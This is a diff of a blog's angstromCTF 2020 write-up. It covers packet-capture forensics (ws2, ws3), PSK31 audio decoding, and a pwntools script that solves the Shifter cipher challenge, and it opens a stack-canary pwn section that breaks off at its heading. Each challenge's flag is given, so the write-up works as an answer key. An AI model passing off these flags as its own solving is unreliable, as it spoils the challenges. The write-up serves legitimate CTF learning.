@@ -153,6 +153,9 @@
         <li><a href="/tag/data">Data</a></li>
     
       
+        <li><a href="/tag/gdb">Gdb</a></li>
+    
+      
         <li><a href="/tag/hack-the-box">Hack-the-box</a></li>
     
       
@@ -160,9 +163,6 @@
     
       
         <li><a href="/tag/ida">Ida</a></li>
-    
-      
-        <li><a href="/tag/infosec">Infosec</a></li>
     
       
         <li>...</li>
@@ -183,7 +183,7 @@
   <span class="article-list-minutes">
     
     
-      21 minute read
+      25 minute read
     
   </span>
   <span class="article-list-divider">-</span>
@@ -231,6 +231,15 @@
       
       <a href="/tag/hacking" title="See all posts with tag 'Hacking'">Hacking</a>
     
+      
+      <a href="/tag/gdb" title="See all posts with tag 'GDB'">GDB</a>
+    
+      
+      <a href="/tag/overflow" title="See all posts with tag 'Overflow'">Overflow</a>
+    
+      
+      <a href="/tag/stack-canary" title="See all posts with tag 'Stack-Canary'">Stack-Canary</a>
+    
   </div>
 </div>
           </header>
@@ -252,18 +261,23 @@
       <li><a href="https://ah-sayed.github.io/posts/angstromctf-2020#4-one-time-pad">One Time Pad</a></li>
     </ol>
   </li>
-  <li>Reverse
-    <ol>
-      <li><a href="https://ah-sayed.github.io/posts/angstromctf-2020#1-windows-of-opportunity">Windows of Opportunity</a></li>
-      <li><a href="https://ah-sayed.github.io/posts/angstromctf-2020#2-taking-off">Taking Off</a></li>
-    </ol>
-  </li>
   <li>Miscellaneous
     <ol>
       <li><a href="https://ah-sayed.github.io/posts/angstromctf-2020#1-ws2">ws2</a></li>
       <li><a href="https://ah-sayed.github.io/posts/angstromctf-2020#2-ws3">ws3</a></li>
       <li><a href="https://ah-sayed.github.io/posts/angstromctf-2020#3-psk">PSK</a></li>
       <li><a href="https://ah-sayed.github.io/posts/angstromctf-2020#4-shifter">Shifter</a></li>
+    </ol>
+  </li>
+  <li>Reverse
+    <ol>
+      <li><a href="https://ah-sayed.github.io/posts/angstromctf-2020#1-windows-of-opportunity">Windows of Opportunity</a></li>
+      <li><a href="https://ah-sayed.github.io/posts/angstromctf-2020#2-taking-off">Taking Off</a></li>
+    </ol>
+  </li>
+  <li>Binary
+    <ol>
+      <li><a href="https://ah-sayed.github.io/posts/angstromctf-2020#1-canary">Canary</a></li>
     </ol>
   </li>
 </ul>
@@ -590,6 +604,261 @@ Enter:
 Your answer: actf{one_time_pad_more_like_i_dont_like_crypto-1982309}</span></code></pre></figure>
 
 <p>One Time Pad is so bad.</p>
+
+<h2 id="--misc">- Misc</h2>
+<hr>
+
+<h3 id="1-ws2">1. ws2</h3>
+<blockquote>
+  <p>No ascii, not problem :)
+<a href="https://files.actf.co/3d02af8f9607577cbf7565844a1343efe1885c5428905499e86ebfb5197be21f/recording.pcapng">recording.pcapng</a></p>
+</blockquote>
+
+<p>This challenge like the first one <strong>ws1</strong> it gives us a network packet capture file, so first let’s see what it contains using <code class="highlighter-rouge">binwalk</code>.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span>binwalk recording.pcapng 
+<span class="go">
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+3003          0xBBB           HTML document header
+3328          0xD00           HTML document footer
+5688          0x1638          JPEG image data, JFIF standard 1.01
+111167        0x1B23F         HTML document header
+111545        0x1B3B9         HTML document footer</span></code></pre></figure>
+
+<p>It contains some HTML files and that means there are some <code class="highlighter-rouge">HTTP</code> requests in the capture file and the interesting one is a <code class="highlighter-rouge">JPEG</code> image at offset <code class="highlighter-rouge">0x1638</code>.</p>
+
+<p>Let’s extract this image using <code class="highlighter-rouge">dd</code> command:</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span><span class="nb">dd </span><span class="k">if</span><span class="o">=</span>recording.pcapng <span class="nv">bs</span><span class="o">=</span>1 <span class="nv">skip</span><span class="o">=</span><span class="k">$((</span><span class="m">0</span>x1638<span class="k">))</span> <span class="nv">count</span><span class="o">=</span><span class="k">$((</span><span class="m">0</span>x1b23f-0x1638<span class="k">))</span> <span class="nv">of</span><span class="o">=</span>file2.jpg
+<span class="go">105479+0 records in
+105479+0 records out
+105479 bytes (105 kB, 103 KiB) copied, 0.509051 s, 207 kB/s
+</span><span class="gp">root@kali:~#</span><span class="w"> </span>file file.jpg 
+<span class="go">file2.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 72x72, segment length 16, baseline, precision 8, 1500x1461, components 3</span></code></pre></figure>
+
+<p>The command just skip <code class="highlighter-rouge">0x1638</code> blocks and count <code class="highlighter-rouge">0x1b23f-0x1638</code> blocks to extract the image and by looking at it.</p>
+
+<p><a href="/assets/documentation/angstrom-ctf/ws2/corrupted-c61f1fbad190f11c9291f79b32ab786bc1ffc694ff96287f52b2033b1d04be0c.jpg">
+  <img src="/assets/documentation/angstrom-ctf/ws2/corrupted-c61f1fbad190f11c9291f79b32ab786bc1ffc694ff96287f52b2033b1d04be0c.jpg" alt="corr" class="zooming" data-rjs="/assets/documentation/angstrom-ctf/ws2/corrupted-c61f1fbad190f11c9291f79b32ab786bc1ffc694ff96287f52b2033b1d04be0c.jpg" data-zooming-width="1500" data-zooming-height="1461">
+</a></p>
+
+<p>It looks corrupted so let’s look at the magic bytes in hex editor. As we know the <code class="highlighter-rouge">JPEG</code> images starts with <code class="highlighter-rouge">FF D8</code> and ends with <code class="highlighter-rouge">FF D9</code>.</p>
+
+<p>I found the first bytes it seems good nothing with them.</p>
+
+<p><a href="/assets/documentation/angstrom-ctf/ws2/hex1-979e1b1c8e0b81d99373e2504701173f9bf0ff5c20483f2e4e678c319e778bd6.png">
+  <img src="/assets/documentation/angstrom-ctf/ws2/hex1-979e1b1c8e0b81d99373e2504701173f9bf0ff5c20483f2e4e678c319e778bd6.png" alt="hex" class="zooming" data-rjs="/assets/documentation/angstrom-ctf/ws2/hex1-979e1b1c8e0b81d99373e2504701173f9bf0ff5c20483f2e4e678c319e778bd6.png" data-zooming-width="639" data-zooming-height="60">
+</a></p>
+
+<p>But when I looked at the last bytes there’re some addtional bytes in the hex dump, so let’s remove them and save the file.</p>
+
+<p><a href="/assets/documentation/angstrom-ctf/ws2/hex2-bb41fba9489748a43066caf31ace8e44899e75c31bdf114831834dc6cfba5067.png">
+  <img src="/assets/documentation/angstrom-ctf/ws2/hex2-bb41fba9489748a43066caf31ace8e44899e75c31bdf114831834dc6cfba5067.png" alt="hex" class="zooming" data-rjs="/assets/documentation/angstrom-ctf/ws2/hex2-bb41fba9489748a43066caf31ace8e44899e75c31bdf114831834dc6cfba5067.png" data-zooming-width="637" data-zooming-height="68">
+</a></p>
+
+<p>Oh! That’s not good the image still the same. Now, let’s jump into <code class="highlighter-rouge">wireshark</code> and see the original packets.</p>
+
+<p><a href="/assets/documentation/angstrom-ctf/ws2/wire-336b949aced0c538ec6d8e1658e2261ee1205156f5ae12189d5f52118a8db255.png">
+  <img src="/assets/documentation/angstrom-ctf/ws2/wire-336b949aced0c538ec6d8e1658e2261ee1205156f5ae12189d5f52118a8db255.png" alt="wire" class="zooming" data-rjs="/assets/documentation/angstrom-ctf/ws2/wire-336b949aced0c538ec6d8e1658e2261ee1205156f5ae12189d5f52118a8db255.png" data-zooming-width="1093" data-zooming-height="265">
+</a></p>
+
+<p>After I filtered the packets I got 4 <code class="highlighter-rouge">HTTP</code> requests and one of them is <code class="highlighter-rouge">POST</code> request contains an image. So let’s follow HTTP stream and extract the raw bytes.</p>
+
+<p><a href="/assets/documentation/angstrom-ctf/ws2/raw-94e4103328f23d29d47ae5458042cea1afe6fabb8625b68eb7451a2030978330.png">
+  <img src="/assets/documentation/angstrom-ctf/ws2/raw-94e4103328f23d29d47ae5458042cea1afe6fabb8625b68eb7451a2030978330.png" alt="raw" class="zooming" data-rjs="/assets/documentation/angstrom-ctf/ws2/raw-94e4103328f23d29d47ae5458042cea1afe6fabb8625b68eb7451a2030978330.png" data-zooming-width="1244" data-zooming-height="654">
+</a></p>
+
+<p>After I dumped the raw bytes from <code class="highlighter-rouge">FF D8 FF E0</code> to <code class="highlighter-rouge">FF D9</code> into a new file I got the original image.</p>
+
+<p><a href="/assets/documentation/angstrom-ctf/ws2/flag-144b4aacbb62ed8bfd9d955f5902d73d54d9b43391cd0f6db258dae9e5bc952e.jpg">
+  <img src="/assets/documentation/angstrom-ctf/ws2/flag-144b4aacbb62ed8bfd9d955f5902d73d54d9b43391cd0f6db258dae9e5bc952e.jpg" alt="flag" class="zooming" data-rjs="/assets/documentation/angstrom-ctf/ws2/flag-144b4aacbb62ed8bfd9d955f5902d73d54d9b43391cd0f6db258dae9e5bc952e.jpg" data-zooming-width="1500" data-zooming-height="1461">
+</a></p>
+
+<p>Flag: <code class="highlighter-rouge">actf{ok_to_b0r0s-4809813}</code></p>
+
+<h3 id="2-ws3">2. ws3</h3>
+
+<blockquote>
+  <p>What the… <a href="https://files.actf.co/5dfa75c41aee37fc4b27257d31d06e6e7ebc41f618f8a81961f94f25905e6aa9/record.pcapng">record.pcapng</a>
+hint: Did I send something? Or…</p>
+</blockquote>
+
+<p>Like the previous one I ran binwalk on the capture file but this time I got a bunch of <code class="highlighter-rouge">zlib</code> files.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span>binwalk record.pcapng 
+<span class="go">DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+3664          0xE50           Zlib compressed data, default compression
+3793          0xED1           Zlib compressed data, default compression
+3841          0xF01           Zlib compressed data, default compression
+14810         0x39DA          Zlib compressed data, default compression
+14969         0x3A79          Zlib compressed data, default compression
+38120         0x94E8          Zlib compressed data, default compression
+38258         0x9572          Zlib compressed data, default compression</span></code></pre></figure>
+
+<p>So I decided to jumb into <code class="highlighter-rouge">wireshark</code> again and look for any <code class="highlighter-rouge">HTTP</code> packets.</p>
+
+<p><a href="/assets/documentation/angstrom-ctf/ws3/wire-3802b822a0a554c70de58ddcad6dc0c349ae1a8d9cb2352b9b70707c65bf752c.png">
+  <img src="/assets/documentation/angstrom-ctf/ws3/wire-3802b822a0a554c70de58ddcad6dc0c349ae1a8d9cb2352b9b70707c65bf752c.png" alt="wire" class="zooming" data-rjs="/assets/documentation/angstrom-ctf/ws3/wire-3802b822a0a554c70de58ddcad6dc0c349ae1a8d9cb2352b9b70707c65bf752c.png" data-zooming-width="1550" data-zooming-height="597">
+</a></p>
+
+<p>I noticed <code class="highlighter-rouge">HTTP</code> packet with length <code class="highlighter-rouge">2131</code> bigger than the others, so let’s look at it.</p>
+
+<p><a href="/assets/documentation/angstrom-ctf/ws3/raw-32fd7938a489dd8171f7ac8c7c715e4937b786a07032b8e0614f005bdf8a1afa.png">
+  <img src="/assets/documentation/angstrom-ctf/ws3/raw-32fd7938a489dd8171f7ac8c7c715e4937b786a07032b8e0614f005bdf8a1afa.png" alt="raw" class="zooming" data-rjs="/assets/documentation/angstrom-ctf/ws3/raw-32fd7938a489dd8171f7ac8c7c715e4937b786a07032b8e0614f005bdf8a1afa.png" data-zooming-width="1392" data-zooming-height="692">
+</a></p>
+
+<p>I know the magic bytes for <code class="highlighter-rouge">zlib</code> file and can be one of:</p>
+<ol>
+  <li>
+<code class="highlighter-rouge">78 01</code> - No Compression/low</li>
+  <li>
+<code class="highlighter-rouge">78 9C</code> - Default Compression</li>
+  <li>
+<code class="highlighter-rouge">78 DA</code> - Best Compression</li>
+</ol>
+
+<p>After looking in the raw bytes for the packet I found first <code class="highlighter-rouge">78 9C</code> and the end of the file is unknown so let’s extract it into a new file.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span>file file.zlib 
+<span class="go">ws3_3.zlib: zlib compressed data</span></code></pre></figure>
+
+<p>I looked again with binwalk the file contains 3 other <code class="highlighter-rouge">zlib</code> files.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span>binwalk Zlib 
+<span class="go">DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Zlib compressed data, default compression
+159           0x9F            Zlib compressed data, default compression
+242           0xF2            Zlib compressed data, default compression</span></code></pre></figure>
+
+<p>So, I decided to extract each one and look at them one by one.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span><span class="nb">dd </span><span class="k">if</span><span class="o">=</span>Zlib <span class="nv">bs</span><span class="o">=</span>1 <span class="nv">count</span><span class="o">=</span>159 <span class="nv">of</span><span class="o">=</span>1.zlip
+<span class="go">159+0 records in
+159+0 records out
+159 bytes copied, 0.0008654 s, 184 kB/s
+</span><span class="gp">root@kali:~#</span><span class="w"> </span><span class="nb">dd </span><span class="k">if</span><span class="o">=</span>Zlib <span class="nv">bs</span><span class="o">=</span>1 <span class="nv">skip</span><span class="o">=</span>159 <span class="nv">count</span><span class="o">=</span><span class="k">$((</span><span class="m">0</span>xf2-0x9f<span class="k">))</span> <span class="nv">of</span><span class="o">=</span>2.zlip
+<span class="go">83+0 records in
+83+0 records out
+83 bytes copied, 0.00072573 s, 114 kB/s
+</span><span class="gp">root@kali:~#</span><span class="w"> </span><span class="nb">dd </span><span class="k">if</span><span class="o">=</span>Zlib <span class="nv">bs</span><span class="o">=</span>1 <span class="nv">skip</span><span class="o">=</span>242 <span class="nv">of</span><span class="o">=</span>3.zlip
+<span class="go">17643+0 records in
+17643+0 records out
+17643 bytes (18 kB, 17 KiB) copied, 0.050157 s, 352 kB/s</span></code></pre></figure>
+
+<p>Now, let’s extract them:</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span><span class="nb">cat </span>3.zlip | python <span class="nt">-c</span> <span class="s2">"import zlib,sys;sys.stdout.write(zlib.decompress(sys.stdin.read()))"</span> | <span class="nb">head</span> <span class="nt">-1</span>
+<span class="go">����JFIFHH��C   	
+close failed in file object destructor:
+sys.excepthook is missing
+lost sys.stderr</span></code></pre></figure>
+
+<p>And I got the flag as a <code class="highlighter-rouge">JPEG</code> image at the last file.</p>
+
+<p><a href="/assets/documentation/angstrom-ctf/ws3/flag-45696f671cee10b441388d6a10034488684d9c13abafe2137698cc14ca015d42.jpg">
+  <img src="/assets/documentation/angstrom-ctf/ws3/flag-45696f671cee10b441388d6a10034488684d9c13abafe2137698cc14ca015d42.jpg" alt="flag" class="zooming" data-rjs="/assets/documentation/angstrom-ctf/ws3/flag-45696f671cee10b441388d6a10034488684d9c13abafe2137698cc14ca015d42.jpg" data-zooming-width="413" data-zooming-height="549">
+</a></p>
+
+<p><code class="highlighter-rouge">actf{git_good_git_wireshark-123323}</code></p>
+
+<h3 id="3-psk">3. PSK</h3>
+
+<blockquote>
+  <p>My friend sent my yet another mysterious recording…
+He told me he was inspired by PicoCTF 2019 and made his own transmissions. I’ve looked at it, and it seems to be really compact and efficient.
+Only 31 bps!!
+See if you can decode <a href="https://files.actf.co/eae0a3d5c6d525249b88d8f11881e3a99665c986f526d20d1b8bb98247a8e85a/transmission.wav">what he sent to me</a>. It’s in actf{} format</p>
+</blockquote>
+
+<p>This one I spend some time to figure out what he want and what’s the record. But after searching about <code class="highlighter-rouge">PSK</code> I found It’s just an audio with amplitude and phase-modulated waveform that is converted to an audio frequency analog signal by a sound card.</p>
+
+<p>And guess what it can be decoded usign the PSK31 software like <code class="highlighter-rouge">EssexPSK</code>.</p>
+
+<p>After I download the software and put the mic on the headphones to decode the audio it gives me the flag. <img class="emoji" title=":grinning:" alt=":grinning:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f600.png" height="20" width="20"></p>
+
+<p><a href="/assets/documentation/angstrom-ctf/PSK-5a539985ce01430fbde7a8468521492d026a5b6eef7e27cfaf9b308de706e8d7.png">
+  <img src="/assets/documentation/angstrom-ctf/PSK-5a539985ce01430fbde7a8468521492d026a5b6eef7e27cfaf9b308de706e8d7.png" alt="flag" class="zooming" data-rjs="/assets/documentation/angstrom-ctf/PSK-5a539985ce01430fbde7a8468521492d026a5b6eef7e27cfaf9b308de706e8d7.png" data-zooming-width="841" data-zooming-height="312">
+</a></p>
+
+<p><code class="highlighter-rouge">actf{hamhamhamhamham}</code></p>
+
+<h3 id="4-shifter">4. Shifter</h3>
+
+<blockquote>
+  <p>What a strange challenge…
+It’ll be no problem for you, of course!
+<code class="highlighter-rouge">nc misc.2020.chall.actf.co 20300</code></p>
+</blockquote>
+
+<blockquote>
+  <p>hint: Do you really need to calculate all those numbers?</p>
+</blockquote>
+
+<p>This challenges seems interesting when I connect with the server it asks me the following:</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span>nc misc.2020.chall.actf.co 20300
+<span class="go">Solve 50 of these epic problems in a row to prove you are a master crypto man like Aplet123!
+You'll be given a number n and also a plaintext p.
+Caesar shift `p` with the nth Fibonacci number.
+n &lt; 50, p is completely uppercase and alphabetic, len(p) &lt; 50
+You have 60 seconds!
+--------------------
+Shift AZPHUYBJHVY by n=44
+: </span></code></pre></figure>
+
+<p>It’s just a ceaser cipher but with key as <a href="https://en.wikipedia.org/wiki/Fibonacci_number">Fibonacci</a> number, and the n he given is pretty small to calculate.</p>
+
+<p><img src="https://latex.codecogs.com/gif.latex?Fib%28n%29%3DFib%28n-1%29%20&amp;plus;%20Fib%28n-2%29" alt="Fib(n)=Fib(n-1) + Fib(n-2)"></p>
+
+<p>So, let’s write small <code class="highlighter-rouge">python</code> script to do it and get the flag.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/env python
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'critical'</span>
+
+<span class="n">fib_arr</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">]</span>
+<span class="k">def</span> <span class="nf">fib</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">n</span><span class="o">&lt;=</span><span class="nb">len</span><span class="p">(</span><span class="n">fib_arr</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">fib_arr</span><span class="p">[</span><span class="n">n</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">temp_fib</span> <span class="o">=</span> <span class="n">fib</span><span class="p">(</span><span class="n">n</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">fib</span><span class="p">(</span><span class="n">n</span><span class="o">-</span><span class="mi">2</span><span class="p">)</span>
+        <span class="n">fib_arr</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">temp_fib</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">temp_fib</span>
+<span class="n">fib</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">text</span><span class="p">,</span><span class="n">k</span><span class="p">):</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="s">""</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">text</span><span class="p">)):</span>
+        <span class="n">char</span> <span class="o">=</span> <span class="n">text</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">((</span><span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">)</span> <span class="o">+</span> <span class="n">k</span> <span class="o">-</span> <span class="mi">65</span><span class="p">)</span> <span class="o">%</span> <span class="mi">26</span> <span class="o">+</span> <span class="mi">65</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">result</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'misc.2020.chall.actf.co'</span><span class="p">,</span> <span class="mi">20300</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'--------------------'</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">50</span><span class="p">):</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)</span>
+    <span class="n">m</span><span class="p">,</span> <span class="n">k</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">fib_arr</span><span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="mi">2</span><span class="p">:])]</span>
+    <span class="k">print</span> <span class="s">'</span><span class="se">\r</span><span class="s">[+] Level'</span><span class="p">,</span> <span class="p">(</span><span class="n">_</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">(</span><span class="n">m</span><span class="p">,</span><span class="n">k</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span><span class="n">res</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span></code></pre></figure>
+
+<p>And finally I got it.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span>python shifter.py 
+<span class="go">[+] Level 1
+[+] Level 2
+</span><span class="c">.
+.
+.
+</span><span class="go">[+] Level 49
+[+] Level 50
+actf{h0p3_y0u_us3d_th3_f0rmu14-1985098}</span></code></pre></figure>
+
 <h2 id="reverse">Reverse</h2>
 <hr>
 
@@ -714,263 +983,134 @@ please give flag
 Good job! You're ready to move on to bigger and badder rev!
 actf{th3y_gr0w_up_s0_f4st}</span></code></pre></figure>
 
-<h2 id="--misc">- Misc</h2>
+<h2 id="binary-pwn">Binary (Pwn)</h2>
 <hr>
 
-<h3 id="1-ws2">1. ws2</h3>
-<blockquote>
-  <p>No ascii, not problem :)
-<a href="https://files.actf.co/3d02af8f9607577cbf7565844a1343efe1885c5428905499e86ebfb5197be21f/recording.pcapng">recording.pcapng</a></p>
-</blockquote>
-
-<p>This challenge like the first one <strong>ws1</strong> it gives us a network packet capture file, so first let’s see what it contains using <code class="highlighter-rouge">binwalk</code>.</p>
-
-<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span>binwalk recording.pcapng 
-<span class="go">
-DECIMAL       HEXADECIMAL     DESCRIPTION
---------------------------------------------------------------------------------
-3003          0xBBB           HTML document header
-3328          0xD00           HTML document footer
-5688          0x1638          JPEG image data, JFIF standard 1.01
-111167        0x1B23F         HTML document header
-111545        0x1B3B9         HTML document footer</span></code></pre></figure>
-
-<p>It contains some HTML files and that means there are some <code class="highlighter-rouge">HTTP</code> requests in the capture file and the interesting one is a <code class="highlighter-rouge">JPEG</code> image at offset <code class="highlighter-rouge">0x1638</code>.</p>
-
-<p>Let’s extract this image using <code class="highlighter-rouge">dd</code> command:</p>
-
-<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span><span class="nb">dd </span><span class="k">if</span><span class="o">=</span>recording.pcapng <span class="nv">bs</span><span class="o">=</span>1 <span class="nv">skip</span><span class="o">=</span><span class="k">$((</span><span class="m">0</span>x1638<span class="k">))</span> <span class="nv">count</span><span class="o">=</span><span class="k">$((</span><span class="m">0</span>x1b23f-0x1638<span class="k">))</span> <span class="nv">of</span><span class="o">=</span>file2.jpg
-<span class="go">105479+0 records in
-105479+0 records out
-105479 bytes (105 kB, 103 KiB) copied, 0.509051 s, 207 kB/s
-</span><span class="gp">root@kali:~#</span><span class="w"> </span>file file.jpg 
-<span class="go">file2.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 72x72, segment length 16, baseline, precision 8, 1500x1461, components 3</span></code></pre></figure>
-
-<p>The command just skip <code class="highlighter-rouge">0x1638</code> blocks and count <code class="highlighter-rouge">0x1b23f-0x1638</code> blocks to extract the image and by looking at it.</p>
-
-<p><a href="/assets/documentation/angstrom-ctf/ws2/corrupted-c61f1fbad190f11c9291f79b32ab786bc1ffc694ff96287f52b2033b1d04be0c.jpg">
-  <img src="/assets/documentation/angstrom-ctf/ws2/corrupted-c61f1fbad190f11c9291f79b32ab786bc1ffc694ff96287f52b2033b1d04be0c.jpg" alt="corr" class="zooming" data-rjs="/assets/documentation/angstrom-ctf/ws2/corrupted-c61f1fbad190f11c9291f79b32ab786bc1ffc694ff96287f52b2033b1d04be0c.jpg" data-zooming-width="1500" data-zooming-height="1461">
-</a></p>
-
-<p>It looks corrupted so let’s look at the magic bytes in hex editor. As we know the <code class="highlighter-rouge">JPEG</code> images starts with <code class="highlighter-rouge">FF D8</code> and ends with <code class="highlighter-rouge">FF D9</code>.</p>
-
-<p>I found the first bytes it seems good nothing with them.</p>
-
-<p><a href="/assets/documentation/angstrom-ctf/ws2/hex1-979e1b1c8e0b81d99373e2504701173f9bf0ff5c20483f2e4e678c319e778bd6.png">
-  <img src="/assets/documentation/angstrom-ctf/ws2/hex1-979e1b1c8e0b81d99373e2504701173f9bf0ff5c20483f2e4e678c319e778bd6.png" alt="hex" class="zooming" data-rjs="/assets/documentation/angstrom-ctf/ws2/hex1-979e1b1c8e0b81d99373e2504701173f9bf0ff5c20483f2e4e678c319e778bd6.png" data-zooming-width="639" data-zooming-height="60">
-</a></p>
-
-<p>But when I looked at the last bytes there’re some addtional bytes in the hex dump, so let’s remove them and save the file.</p>
-
-<p><a href="/assets/documentation/angstrom-ctf/ws2/hex2-bb41fba9489748a43066caf31ace8e44899e75c31bdf114831834dc6cfba5067.png">
-  <img src="/assets/documentation/angstrom-ctf/ws2/hex2-bb41fba9489748a43066caf31ace8e44899e75c31bdf114831834dc6cfba5067.png" alt="hex" class="zooming" data-rjs="/assets/documentation/angstrom-ctf/ws2/hex2-bb41fba9489748a43066caf31ace8e44899e75c31bdf114831834dc6cfba5067.png" data-zooming-width="637" data-zooming-height="68">
-</a></p>
-
-<p>Oh! That’s not good the image still the same. Now, let’s jump into <code class="highlighter-rouge">wireshark</code> and see the original packets.</p>
-
-<p><a href="/assets/documentation/angstrom-ctf/ws2/wire-336b949aced0c538ec6d8e1658e2261ee1205156f5ae12189d5f52118a8db255.png">
-  <img src="/assets/documentation/angstrom-ctf/ws2/wire-336b949aced0c538ec6d8e1658e2261ee1205156f5ae12189d5f52118a8db255.png" alt="wire" class="zooming" data-rjs="/assets/documentation/angstrom-ctf/ws2/wire-336b949aced0c538ec6d8e1658e2261ee1205156f5ae12189d5f52118a8db255.png" data-zooming-width="1093" data-zooming-height="265">
-</a></p>
-
-<p>After I filtered the packets I got 4 <code class="highlighter-rouge">HTTP</code> requests and one of them is <code class="highlighter-rouge">POST</code> request contains an image. So let’s follow HTTP stream and extract the raw bytes.</p>
-
-<p><a href="/assets/documentation/angstrom-ctf/ws2/raw-94e4103328f23d29d47ae5458042cea1afe6fabb8625b68eb7451a2030978330.png">
-  <img src="/assets/documentation/angstrom-ctf/ws2/raw-94e4103328f23d29d47ae5458042cea1afe6fabb8625b68eb7451a2030978330.png" alt="raw" class="zooming" data-rjs="/assets/documentation/angstrom-ctf/ws2/raw-94e4103328f23d29d47ae5458042cea1afe6fabb8625b68eb7451a2030978330.png" data-zooming-width="1244" data-zooming-height="654">
-</a></p>
-
-<p>After I dumped the raw bytes from <code class="highlighter-rouge">FF D8 FF E0</code> to <code class="highlighter-rouge">FF D9</code> into a new file I got the original image.</p>
-
-<p><a href="/assets/documentation/angstrom-ctf/ws2/flag-144b4aacbb62ed8bfd9d955f5902d73d54d9b43391cd0f6db258dae9e5bc952e.jpg">
-  <img src="/assets/documentation/angstrom-ctf/ws2/flag-144b4aacbb62ed8bfd9d955f5902d73d54d9b43391cd0f6db258dae9e5bc952e.jpg" alt="flag" class="zooming" data-rjs="/assets/documentation/angstrom-ctf/ws2/flag-144b4aacbb62ed8bfd9d955f5902d73d54d9b43391cd0f6db258dae9e5bc952e.jpg" data-zooming-width="1500" data-zooming-height="1461">
-</a></p>
-
-<p>Flag: <code class="highlighter-rouge">actf{ok_to_b0r0s-4809813}</code></p>
-
-<h3 id="2-ws3">2. ws3</h3>
+<h3 id="1-canary">1. Canary</h3>
 
 <blockquote>
-  <p>What the… <a href="https://files.actf.co/5dfa75c41aee37fc4b27257d31d06e6e7ebc41f618f8a81961f94f25905e6aa9/record.pcapng">record.pcapng</a>
-hint: Did I send something? Or…</p>
-</blockquote>
-
-<p>Like the previous one I ran binwalk on the capture file but this time I got a bunch of <code class="highlighter-rouge">zlib</code> files.</p>
-
-<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span>binwalk record.pcapng 
-<span class="go">DECIMAL       HEXADECIMAL     DESCRIPTION
---------------------------------------------------------------------------------
-3664          0xE50           Zlib compressed data, default compression
-3793          0xED1           Zlib compressed data, default compression
-3841          0xF01           Zlib compressed data, default compression
